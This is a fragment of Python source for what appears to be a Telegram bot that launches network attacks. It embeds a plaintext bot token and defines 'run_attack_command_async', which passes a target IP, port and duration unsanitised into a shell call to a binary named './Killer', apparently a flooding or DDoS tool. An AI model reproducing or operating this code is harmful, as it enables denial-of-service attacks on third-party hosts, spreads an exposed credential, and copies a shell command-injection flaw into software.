...
TOKEN = '7510152916:AAFa5XY3QvfmFnWdP6OsXRZtr6XP_zolQZs'
...
USERNAME = "@TOXICPLAYER002"  # Immutable username for maximum security
...
async def run_attack_command_async(target_ip, target_port, duration):
    ...
    process = await asyncio.create_subprocess_shell(f"./Killer {target_ip} {target_port} {duration} 1000")
